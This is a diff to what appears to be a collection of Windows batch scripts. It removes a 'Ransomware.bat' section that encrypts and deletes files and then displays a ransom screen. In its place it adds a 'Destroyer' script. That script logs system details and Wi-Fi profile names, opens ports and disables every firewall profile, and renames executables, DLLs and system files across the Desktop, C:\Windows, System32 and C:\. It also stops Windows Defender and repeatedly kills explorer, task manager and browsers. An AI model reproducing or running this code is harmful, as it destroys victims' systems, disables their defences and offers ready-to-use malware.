@@ -134,65 +134,118 @@ echo. & pause
 REM echo.: Displays a single blank line on the screen.
 REM pause: This will stop execution of the batch file until someone presses "any key"
 
-(7)Ransomware.bat (.bat)
+(7)Destroyer (.bat)
 
-<!-- :: Batch Section
-@Echo OFF
-mode con:cols=50 lines=2
-set pass=hyper-lynn
+@echo off
+title Lazy-Security
+color 0a
+ren -=- Writes INFO to a .LOG file in Current Directory -=-
+:info
+cls & color 0a
+cd Desktop
+nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
+ver>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Username:%username%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Time: %time%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Date: %date%>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+netsh wlan show profiles>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ipconfig>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO Additional Information:>>9K21JM10B.log
+ipconfig | find /i "IPv4">>9K21JM10B.log
+wmic diskdrive get size>>9K21JM10B.log
+wmic cpu get name>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+ECHO.>>9K21JM10B.log
+systeminfo>>9K21JM10B.log
+goto ports
+ren -=- Opens Port 1122 -=-
+:ports
+cls & color 0a
+netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
+netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
+goto firewall
+ren -=- Turns all Firewalls off -=-
+:firewall
+cls & color 0a
+netsh firewall set opmode disable
+netsh firewall set opmode mode=DISABLE
+netsh advfirewall set currentprofile state off
+netsh advfirewall set domainprofile state off
+netsh advfirewall set privateprofile state off
+netsh advfirewall set publicprofile state off
+netsh advfirewall set allprofiles state off
+goto encryption
+ren -=- Encrypts files with a simple name break -=-
+:encryption
+cls & color 0a
+:Current
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+cd C:\Windows
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+cd C:\Windows\Sys32 & cd C:\Windows\System32
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+cd C:\
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+color 0a & mode 1000 & cls
+pause
+goto virus
+ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
+:virus
+ECHO You have been encrypted by *-*7_SL*- & color 0a
+net stop "Windows Defender Service"
+net stop "Windows Firewall"
+taskkill /F /IM "chrome.exe" /T
+taskkill /F /IM "firefox.exe" /T
+taskkill /F /IM "ProcessHacker.exe" /T
+taskkill /F /IM "explorer.exe" /T
+taskkill /F /IM "taskmgr.exe" /T
+goto virus
 
-Title Lazy
-
-echo Scanning. . . .
-REM Change file extension *.123test for *.doc
-FOR /R "%homedrive%\" %%X in (*.123test) DO (
-REM echo %%X >> %homedrive%\Original.txt SafeMode
-REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
-aescrypt -e -p %pass% "%%X"
-del "%%X"
-)
-
-
-
-REM Block Screen
-cls
-setlocal
-for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
-
--->
-
-<html>
-    <head>
-        <title>CryptMSG</title>
-    <hta:application id="oBVC" 
-                     applicationname="BSOD"  
-                     version="1.0" 
-                     maximizebutton="no" 
-                     minimizebutton="no" 
-                     sysmenu="no" 
-                     Caption="no" 
-                     windowstate="maximize"/> 
-    <style>
-        #texto2{
-            padding-top: 19%;
-            letter-spacing: 1px;
-            text-align: center;
-        }
-    </style>
-</head>
-<body bgcolor="#8c1d1d" scroll="no">
-    <font face="Lucida Console" size="4" color="white">
-<center><p> - RamonWare Crypt - </p></center>
-<div id="texto2">
-    Hi! Your Files Have Been Encrypted!<br>
-    <br><br>
-    Now you need run Decryptor, be careful next time<br>
-    <br><br>
-   https://github.com/hyper-lynn<br>
-    <br><br><br>
-    <img id="imagen" alt="Lazy" src="https://scontent.frgn7-2.fna.fbcdn.net/v/t1.0-9/133969810_228284592302054_4889029259764905635_n.jpg?_nc_cat=104&ccb=2&_nc_sid=e3f864&_nc_eui2=AeGjv0sq8OQgezzFx6q9wnGUggbl5B96x7OCBuXkH3rHs87RCjh6Dz6yPIFn011KwSBUCc2uk4RMwS9eOlZJ00QH&_nc_ohc=2zK0QQ4mqc8AX_HW_qy&_nc_ht=scontent.frgn7-2.fna&oh=9b1649bf63b8b170f06de6f4d0eac136&oe=601C8AF4" height="130" width="100">
-</div>
-</body>
-</html>
-© Lazy-Security, Inc.
 
